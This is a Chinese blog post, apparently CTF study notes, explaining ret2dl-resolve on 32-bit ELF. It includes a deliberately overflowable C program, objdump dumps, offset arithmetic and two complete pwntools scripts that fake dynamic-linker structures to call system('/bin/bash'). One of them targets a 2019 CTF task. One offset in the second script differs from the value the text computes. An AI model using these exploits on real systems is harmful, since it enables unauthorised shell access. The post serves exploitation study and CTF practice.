---
layout:     post   			        # 使用的布局（不需要改）
title:      高阶rop之   			# 标题 
subtitle:   Return-to-dl-resolve逆向理解系列  #副标题
date:       2019-08-26 				# 时间
author:     pic4xiu 		    		# 作者
header-img: img/post-bg-debug.png 		#这篇文章标题背景图片
catalog: true 					# 是否归档
tags:						#标签
    - pwn
---

感觉这个和rop没什么太大关系，主要是理解延迟绑定之类的东西，本篇主要参考**五千年木**(真的感谢)大佬的[文章](https://www.cnblogs.com/elvirangel/p/8994799.html),并对最后exp作出了相对简洁的修改,下面写一下今天的收获

```
//gcc x86.c -fno-stack-protector -m32 -o x86
#include <unistd.h>
#include <string.h>
char gift[0x200];
void fun(){
    char buffer[0x20];
    read(0,buffer,0x200);
}
int main(){
    fun();
    return 0;
}
```
大佬已经写好了,我们研究一下利用思路,这个栈溢出很容易发现,这时候我们需要接触到一个比较高阶的知识点,即利用`_dl_runtime_resolve`,我们首先得学习**延迟绑定**(Lazy Binding),这个网上都有的讲,我们学习完后应该了解函数内部走过的步骤,下面我们根据exp来学习一下

## exp
```
from pwn import *
p = process('./x86')
context.log_level = 'debug'
elf = ELF('./x86')
gift = 0x0804A040#bss

payload = 0x28*'a' + 4*'a'
payload +=  p32(elf.plt['read']) + p32(0x0804840B)#fun_addr
payload += p32(0) + p32(gift) + p32(17*4)

p.sendline(payload)

payload = ''
payload += p32(0x0804a00c) + p32(0x1e807)
payload += p32(0)+p32(0x1e44)
payload += p32(0) *4
payload += 'system\x00\x00'
payload += '/bin/bash\x00'
p.sendline(payload)

payload = 0x28*'a' + 4*'a'
payload += p32(0x080482D0) + p32(0x1da8) + p32(0xbeef) + p32(gift + 10*4)# system + rubbish + 'sh'
p.sendline(payload)

p.interactive()
```
我们简单看一下溢出过程,第一处**payload**,先 **read(0,bss_addr,buf_size)** 把我们的**gift**构造好,之后再跳转到**fun()**,又让我们输入即第三个**payload**,溢出时写的 **0x80482d0** (内容:push   DWORD PTR ds:0x804a004),我们之前的`push 0`被我们自己写的`0x1da8`替代了,所以函数大概是` _dl_runtime_resolve(ds:0x804a004,0x1da8)`,之后一个垃圾数据做填充后填入system的参数即可完成本次攻击,下面我们深入分析一下**gift**

## gift

这是gift内部结构
```
	0x0804a00c
	0x1e807-------
	0            |
------- 0x1e44 <------
|	0
|	0
|	0
|	0
------> syst
	em
	/bin/sh
```
看到这个应该就了解了,我们的2处指向使其指向了system,但是要注意,经过本人测试,第一个数据在`0x0804a000~0x0804affc`都可完成操作,我们来看一下各个部分都是怎么来的

 - `0x1da8`是偏移,即bss和`.rel.plt段`(根据`objdump -s -j .rel.plt ./x86`)位置差
 - `0x1e807`根据`((欲伪造的地址-.dynsym基地址)/0x10)<<8+7`,其中`dynsym`根据`objdump -s -j .dynsym ./x86`
 - `0x1e44`是`伪造地址-.dynstr基地址(objdump -s -j .dynstr ./x86)`
 
最后在伪造地址填入`system`即完成操作,我们拿9102年国赛练习一下

## baby_pwn

```
# pic @ pic-RESCUER-R720-15IKBN in ~/桌面/guosai [19:20:42] 
$ objdump -s -j .rel.plt ./pwn

./pwn：     文件格式 elf32-i386

Contents of section .rel.plt:
 804833c 0ca00408 07010000 10a00408 07020000  ................
 804834c 14a00408 07040000 18a00408 07050000  ................
```

bss段地址为0x804A040,故第一处为0x1d04

```
# pic @ pic-RESCUER-R720-15IKBN in ~/桌面/guosai [19:20:46] 
$ objdump -s -j .dynsym ./pwn

./pwn：     文件格式 elf32-i386

Contents of section .dynsym:
 80481dc 00000000 00000000 00000000 00000000  ................
 80481ec 20000000 00000000 00000000 12000000   ...............
 80481fc 33000000 00000000 00000000 12000000  3...............
 804820c 53000000 00000000 00000000 20000000  S........... ...
 804821c 41000000 00000000 00000000 12000000  A...............
 804822c 39000000 00000000 00000000 12000000  9...............
 804823c 25000000 64a00408 04000000 11001a00  %...d...........
 804824c 2c000000 40a00408 04000000 11001a00  ,...@...........
 804825c 0b000000 fc850408 04000000 11001000  ................
 804826c 1a000000 60a00408 04000000 11001a00  ....`...........
```

此处为  `((0x0804A040 + 4*4) - 0x80481dc) / 0x10 << 8 + 7 即 0x1e707`

```
# pic @ pic-RESCUER-R720-15IKBN in ~/桌面/guosai [19:21:26] C:1
$ objdump -s -j .dynstr ./pwn

./pwn：     文件格式 elf32-i386

Contents of section .dynstr:
 804827c 006c6962 632e736f 2e36005f 494f5f73  .libc.so.6._IO_s
 804828c 7464696e 5f757365 64007374 64696e00  tdin_used.stdin.
 804829c 72656164 00737464 6f757400 73746465  read.stdout.stde
 80482ac 72720061 6c61726d 00736574 76627566  rr.alarm.setvbuf
 80482bc 005f5f6c 6962635f 73746172 745f6d61  .__libc_start_ma
 80482cc 696e005f 5f676d6f 6e5f7374 6172745f  in.__gmon_start_
 80482dc 5f00474c 4942435f 322e3000           _.GLIBC_2.0.    
```

此处为`(0x0804A040 + 8 + 24) - 0x804827c = 0x1ee4`

我们来构造一下exp

```
from pwn import *
p = process('./pwn')
context.log_level = 'debug'
elf = ELF('./pwn')
gift = 0x0804A040#bss

payload = 0x28*'a' + 4*'a'
payload +=  p32(elf.plt['read']) + p32(0x804852D)#fun_addr
payload += p32(0) + p32(gift) + p32(17*4)

p.sendline(payload)
sleep(0.5)

payload = ''
payload += p32(0x0804a00c) + p32(0x1e707)
payload += p32(0)+p32(0x1de4)
payload += p32(0) *4
payload += 'system\x00\x00'
payload += '/bin/bash\x00'
p.sendline(payload)
sleep(0.5)

payload = 0x28*'a' + 4*'a'
payload += p32(0x8048380) + p32(0x1d04) + p32(0xbeef) + p32(gift + 10*4)# system + rubbish + 'sh'
p.sendline(payload)

p.interactive()
```
